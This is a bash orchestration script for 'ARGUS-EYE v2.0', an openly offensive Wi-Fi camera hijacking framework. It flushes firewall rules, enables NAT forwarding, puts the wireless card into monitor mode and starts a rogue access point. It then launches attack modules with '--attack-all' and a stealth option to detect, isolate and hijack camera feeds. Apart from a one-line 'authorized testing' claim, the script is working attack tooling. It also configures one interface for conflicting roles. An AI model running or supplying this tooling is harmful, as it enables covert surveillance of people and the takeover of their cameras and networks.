#!/bin/bash
# ============================================================================
# ARGUS-EYE v2.0 - INTEGRATED TACTICAL DEPLOYMENT SCRIPT
# Advanced Camera Hijacking & Surveillance Testing Framework
# 
# Copyright (c) 2024 F1REW0LF
# License: MIT - For authorized security testing only
# ============================================================================

# ==================== CONFIGURATION ====================
INTERFACE="${INTERFACE:-wlan0}"
STEALTH_MODE="${STEALTH_MODE:-false}"
LOG_FILE="argus_eye_$(date +%Y%m%d_%H%M%S).log"
CONFIG_DIR="$(dirname "$0")"
CORES_DIR="$CONFIG_DIR/argus_core"
NETWORK_DIR="$CONFIG_DIR/network_factory"
PAYLOAD_DIR="$CONFIG_DIR/payload_assets"

# ==================== COLOR CODES ====================
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# ==================== FUNCTIONS ====================

print_banner() {
    echo -e "${PURPLE}"
    echo "    █████╗ ██████╗  ██████╗ ██╗   ██╗███████╗    ███████╗██╗   ██╗███████╗"
    echo "   ██╔══██╗██╔══██╗██╔════╝ ██║   ██║██╔════╝    ██╔════╝╚██╗ ██╔╝██╔════╝"
    echo "   ███████║██████╔╝██║  ███╗██║   ██║█████╗      █████╗   ╚████╔╝ █████╗  "
    echo "   ██╔══██║██╔══██╗██║   ██║██║   ██║██╔══╝      ██╔══╝    ╚██╔╝  ██╔══╝  "
    echo "   ██║  ██║██║  ██║╚██████╔╝╚██████╔╝███████╗    ███████╗   ██║   ███████╗"
    echo "   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚══════╝   ╚═╝   ╚══════╝"
    echo -e "${NC}"
    echo -e "${GREEN}                    ENGINE v2.0 - TACTICAL FRAMEWORK${NC}"
    echo -e "${YELLOW}          Advanced Camera Hijacking & Surveillance Testing${NC}"
    echo -e "${CYAN}    Modules: WiFi Hijacking | ONVIF Discovery | RTSP Injection${NC}"
    echo "============================================================================"
}

log() {
    local level="$1"
    local message="$2"
    local color="${NC}"
    
    case "$level" in
        "INFO") color="${GREEN}" ;;
        "WARN") color="${YELLOW}" ;;
        "ERROR") color="${RED}" ;;
        "DEBUG") color="${CYAN}" ;;
        *) color="${WHITE}" ;;
    esac
    
    echo -e "[$(date +'%H:%M:%S')] ${color}[$level]${NC} $message" | tee -a "$LOG_FILE"
}

check_root() {
    if [ "$EUID" -ne 0 ]; then
        log "ERROR" "Please execute as root (sudo)"
        exit 1
    fi
}

check_dependencies() {
    log "INFO" "Checking dependencies..."
    
    local deps=("python3" "airmon-ng" "iw" "ifconfig" "iptables" "hostapd" "dnsmasq")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [ ${#missing[@]} -ne 0 ]; then
        log "ERROR" "Missing dependencies: ${missing[*]}"
        log "INFO" "Install with: apt-get install ${missing[*]}"
        exit 1
    fi
    
    # Check Python modules
    python3 -c "import scapy, cv2, numpy" 2>/dev/null
    if [ $? -ne 0 ]; then
        log "ERROR" "Missing Python modules"
        log "INFO" "Install with: pip3 install -r requirements.txt"
        exit 1
    fi
    
    log "INFO" "All dependencies satisfied"
}

setup_network() {
    log "INFO" "Setting up network configuration..."
    
    # Step 1: Get dynamic IP
    DYNAMIC_KALI_IP=$(ip -4 addr show "$INTERFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
    
    if [ -z "$DYNAMIC_KALI_IP" ]; then
        log "ERROR" "Interface $INTERFACE has no active IP. Check connectivity."
        exit 1
    fi
    
    log "INFO" "Interface IP: $DYNAMIC_KALI_IP"
    
    # Step 2: Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward
    log "DEBUG" "IP forwarding enabled"
    
    # Step 3: Flush firewall rules
    iptables --flush 2>/dev/null
    iptables -t nat --flush 2>/dev/null
    log "DEBUG" "Firewall rules flushed"
    
    # Step 4: Setup NAT
    iptables -t nat -A POSTROUTING -o "$INTERFACE" -j MASQUERADE
    iptables -A FORWARD -i "$INTERFACE" -j ACCEPT
    log "DEBUG" "NAT rules configured"
    
    # Step 5: Update dnsmasq config with dynamic IP
    if [ -f "$NETWORK_DIR/dnsmasq.conf" ]; then
        sed -i "s/^interface=.*/interface=$INTERFACE/" "$NETWORK_DIR/dnsmasq.conf"
        log "DEBUG" "dnsmasq config updated"
    fi
    
    # Step 6: Update hostapd config
    if [ -f "$NETWORK_DIR/hostapd.conf" ]; then
        sed -i "s/^interface=.*/interface=$INTERFACE/" "$NETWORK_DIR/hostapd.conf"
        log "DEBUG" "hostapd config updated"
    fi
    
    log "INFO" "Network setup complete"
}

start_rogue_ap() {
    log "INFO" "Starting rogue access point..."
    
    # Kill interfering processes
    airmon-ng check kill 2>/dev/null
    
    # Start hostapd
    if [ -f "$NETWORK_DIR/hostapd.conf" ]; then
        hostapd "$NETWORK_DIR/hostapd.conf" &
        HOSTAPD_PID=$!
        log "INFO" "hostapd started (PID: $HOSTAPD_PID)"
    else
        log "ERROR" "hostapd.conf not found"
        return 1
    fi
    
    # Start dnsmasq
    if [ -f "$NETWORK_DIR/dnsmasq.conf" ]; then
        dnsmasq -C "$NETWORK_DIR/dnsmasq.conf" -d &
        DNSMASQ_PID=$!
        log "INFO" "dnsmasq started (PID: $DNSMASQ_PID)"
    else
        log "ERROR" "dnsmasq.conf not found"
        return 1
    fi
    
    log "INFO" "Rogue AP operational"
}

start_monitor_mode() {
    log "INFO" "Setting up monitor mode on $INTERFACE..."
    
    # Bring interface down
    ip link set "$INTERFACE" down 2>/dev/null
    
    # Set monitor mode
    iw dev "$INTERFACE" set type monitor 2>/dev/null
    
    # Bring interface up
    ip link set "$INTERFACE" up 2>/dev/null
    
    # Set low bitrate for stealth
    if [ "$STEALTH_MODE" = "true" ]; then
        iw dev "$INTERFACE" set bitrates legacy 2.4 1
        log "DEBUG" "Stealth mode: low bitrate set"
    fi
    
    log "INFO" "Monitor mode active on $INTERFACE"
}

run_module() {
    local module="$1"
    local args="$2"
    
    log "INFO" "Running module: $module"
    
    case "$module" in
        "airborne")
            python3 "$CORES_DIR/airborne_hijacker.py" -i "$INTERFACE" $args
            ;;
        "field")
            python3 "$CORES_DIR/field_standardized.py" $args
            ;;
        "matrix")
            python3 "$CORES_DIR/video_matrix.py" &
            MATRIX_PID=$!
            log "INFO" "Video matrix started (PID: $MATRIX_PID)"
            ;;
        "hijack")
            python3 "$CORES_DIR/matrix_hijacker.py" $args
            ;;
        *)
            log "ERROR" "Unknown module: $module"
            return 1
            ;;
    esac
}

cleanup() {
    log "INFO" "Cleaning up resources..."
    
    # Kill processes
    pkill hostapd 2>/dev/null
    pkill dnsmasq 2>/dev/null
    pkill -f video_matrix.py 2>/dev/null
    pkill -f airborne_hijacker.py 2>/dev/null
    
    # Flush firewall
    iptables --flush 2>/dev/null
    iptables -t nat --flush 2>/dev/null
    
    # Reset interface
    ip link set "$INTERFACE" down 2>/dev/null
    iw dev "$INTERFACE" set type managed 2>/dev/null
    ip link set "$INTERFACE" up 2>/dev/null
    
    log "INFO" "Cleanup complete"
}

show_menu() {
    echo ""
    echo -e "${BLUE}┌─────────────────────────────────────────────────────────┐${NC}"
    echo -e "${BLUE}│${NC}  ${WHITE}ARGUS-EYE v2.0 - MAIN MENU${NC}                         ${BLUE}│${NC}"
    echo -e "${BLUE}├─────────────────────────────────────────────────────────┤${NC}"
    echo -e "${BLUE}│${NC}  1. ${GREEN}Airborne${NC}  - WiFi Camera Detection & Isolation   ${BLUE}│${NC}"
    echo -e "${BLUE}│${NC}  2. ${GREEN}Field${NC}     - ONVIF Camera Discovery              ${BLUE}│${NC}"
    echo -e "${BLUE}│${NC}  3. ${GREEN}Matrix${NC}    - Video Matrix Dashboard              ${BLUE}│${NC}"
    echo -e "${BLUE}│${NC}  4. ${GREEN}Rogue AP${NC}  - Setup Rogue Access Point            ${BLUE}│${NC}"
    echo -e "${BLUE}│${NC}  5. ${RED}Cleanup${NC}   - Stop all processes & reset         ${BLUE}│${NC}"
    echo -e "${BLUE}│${NC}  6. ${RED}Exit${NC}      - Exit framework                      ${BLUE}│${NC}"
    echo -e "${BLUE}└─────────────────────────────────────────────────────────┘${NC}"
    echo ""
}

full_auto_deployment() {
    log "INFO" "Starting full auto deployment..."
    
    # Setup
    check_root
    check_dependencies
    setup_network
    start_monitor_mode
    start_rogue_ap
    
    # Start video matrix
    run_module "matrix"
    
    # Run airborne hijacker with auto-attack
    log "INFO" "Starting automated camera detection and isolation..."
    
    if [ "$STEALTH_MODE" = "true" ]; then
        run_module "airborne" "--stealth --attack-all --duration 10"
    else
        run_module "airborne" "--attack-all --duration 15"
    fi
    
    # Run ONVIF discovery
    log "INFO" "Running ONVIF camera discovery..."
    run_module "field"
    
    # Interactive menu
    while true; do
        show_menu
        read -p "[>] Selection: " choice
        
        case "$choice" in
            1) run_module "airborne" ;;
            2) run_module "field" ;;
            3) run_module "matrix" ;;
            4) start_rogue_ap ;;
            5) cleanup; break ;;
            6) cleanup; exit 0 ;;
            *) log "WARN" "Invalid selection" ;;
        esac
    done
}

show_help() {
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "Options:"
    echo "  -i, --interface <iface>    Wireless interface (default: wlan0)"
    echo "  -s, --stealth              Enable stealth mode"
    echo "  -a, --auto                 Run full auto deployment"
    echo "  -m, --menu                 Show interactive menu (default)"
    echo "  -h, --help                 Show this help"
    echo ""
    echo "Examples:"
    echo "  $0 -i wlan0mon -s          Run with stealth mode on wlan0mon"
    echo "  $0 -a                      Run full auto deployment"
    echo "  $0 -m                      Show interactive menu"
}

# ==================== MAIN ====================

# Parse arguments
AUTO_MODE=false
MENU_MODE=false

while [[ $# -gt 0 ]]; do
    case $1 in
        -i|--interface)
            INTERFACE="$2"
            shift 2
            ;;
        -s|--stealth)
            STEALTH_MODE=true
            shift
            ;;
        -a|--auto)
            AUTO_MODE=true
            shift
            ;;
        -m|--menu)
            MENU_MODE=true
            shift
            ;;
        -h|--help)
            show_help
            exit 0
            ;;
        *)
            echo "Unknown option: $1"
            show_help
            exit 1
            ;;
    esac
done

# Main execution
print_banner

# Trap signals for clean exit
trap cleanup SIGINT SIGTERM

if [ "$AUTO_MODE" = true ]; then
    full_auto_deployment
elif [ "$MENU_MODE" = true ] || [ $# -eq 0 ]; then
    check_root
    check_dependencies
    
    # Setup basics
    setup_network
    start_monitor_mode
    
    # Show menu
    while true; do
        show_menu
        read -p "[>] Selection: " choice
        
        case "$choice" in
            1) run_module "airborne" ;;
            2) run_module "field" ;;
            3) run_module "matrix" ;;
            4) start_rogue_ap ;;
            5) cleanup; break ;;
            6) cleanup; exit 0 ;;
            *) log "WARN" "Invalid selection" ;;
        esac
    done
fi
